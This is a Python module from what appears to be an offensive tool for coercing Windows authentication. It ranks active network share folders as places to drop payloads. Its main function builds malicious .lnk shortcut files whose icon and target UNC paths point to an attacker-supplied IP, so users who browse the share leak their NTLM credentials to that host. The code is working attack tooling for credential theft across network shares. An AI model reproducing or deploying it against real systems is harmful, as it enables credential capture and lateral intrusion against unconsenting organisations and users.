"""
Author: George Hamilton
Description: This module is used to rank and filter the optimal share locations for deploying
payloads that coerce authentication based on recent access. This module can then be used to bulk
deploy multiple types of payloads to the identified locations. Lastly, this module can be used to
bulk cleanup multiple types of payloads from the identified locations.
"""

from datetime import datetime, timedelta
from pathlib import Path


def is_valid_payload_name(payload_name, available_extensions):
    """
    is_valid_payload_name(payload_name, available_extensions)

    :param str payload_name: A potential name for payloads
    :param list available_extensions: A list of supported payload extensions (without the .)

    :return: A bool indicateing whether or not the payload name is valid.

    Accepts a potential payload name. Validates the payload name has an extension and that the
    extension is supported. Returns True if the payload name is valid or False if it is not.
    """
    invalid_payload_message = 'Invalid payload extension provided. Payload must end in one of the'\
                              'following:'
    for available_extension in available_extensions:
        invalid_payload_message = invalid_payload_message + (f'\n\t.{available_extension}')

    payload_extension = Path(payload_name).suffix
    if payload_extension not in available_extensions:
        print(invalid_payload_message)
        is_valid = False
    else:
        is_valid = True

    return is_valid


def create_lnk_payload(attacker_ip, template_bytes):
    """
    create_lnk(attacker_ip, payload_name)

    This function generates a Windows shortcut (.lnk) file with a specified icon and target UNC
    path and returns the contents as bytes.

    :param attacker_ip (str): The IP address of the attacker's machine.
    :param payload_name (str): The desired name of the output shortcut file.

    :return: Returns bytes if the lnk file is successfully created; otherwise, returns False.

    The function creates a shortcut file by injecting the attacker's IP address into a provided lnk
    template. It sets the icon file UNC path and the target UNC path in the lnk file to the
    provided attacker's IP. If the resulting path names exceed the maximum tested length of 238
    characters, the function prints a message and returns False. Otherwise, it returns the content
    of the generated shortcut file as bytes.
    """
    img_unc_offset = 0x16D # Offset to the icon file unc path in the template
    target_unc_offset = 0x931 # Offset to the target for the lnk file in the template
    max_path = 239 # Max tested length is 238

    img_unc_path = f'\\\\{attacker_ip}\\test.ico'
    target_unc_path = f'\\\\{attacker_ip}\\test'

    if len(img_unc_path) >= max_path or len(target_unc_path) >= max_path:
        print("Path name too long for lnk template, skipping.")
        return False

    img_unc_path = (img_unc_path + '\x00').encode('utf-16le')
    target_unc_path = (target_unc_path + '\x00').encode('utf-16le')

    payload_bytes = template_bytes

    for i in range(0, len(img_unc_path)):
        payload_bytes[img_unc_offset + i] = img_unc_path[i]

    for i in range(0, len(target_unc_path)):
        payload_bytes[target_unc_offset + i] = target_unc_path[i]

    return payload_bytes


def compute_threshold_date(current_date, theshold_length):
    threshold_date = current_date - timedelta(days=theshold_length)
    return threshold_date


def is_active_file(threshold_date, access_time):
    access_time = datetime.fromtimestamp(access_time)
    return access_time >= threshold_date


def sort_rankings(folder_rankings):
    sorted_rankings = dict(sorted(folder_rankings.items(), key=lambda item: item[1], reverse=True))
    return sorted_rankings


def filter_targets(targets, sorted_rankings, max_folders_per_target):
    """
    filter_targets(targets, sorted_rankings, max_folders_per_target)

    :param list targets: List of UNC paths to shares and base directories to review.
    :param dict sorted_rankings: A dictionary in the format {<folder UNC path>: <ranking>} sorted
    by ranking.
    :param int max_folders_per_target: Number of deployment targets to output per supplied
    target share or folder.

    :return: A list of UNC paths for payload deployemnt. This contains at most
    max_folders_per_target deployment targets for each supplied target share or folder.

    Accepts a list of target shares or folders supplied by the user, a dictionary sorted by ranking
    of each potential deployment target and its ranking, and a maximum number of deployment targets
    per supplied target. Returns a list of deployment targets.
    """
    filtered_rankings = []

    # For each share target in the list
    for share in targets:
        # Filter the dictionary to only include keys that begin with the share target
        matching_share_paths = [key for key in sorted_rankings.keys() if share == key or f'{share}\\' == key[:len(share)+1]]

        # Sort the matching share paths based on their ranking and keep only the top N
        top_matching_share_paths = sorted(matching_share_paths,
                                        key=lambda key: sorted_rankings[key], reverse=True)[:max_folders_per_target]

        # Update the sorted_rankings dictionary with the top N matching share paths
        filtered_rankings.extend(top_matching_share_paths)

    return filtered_rankings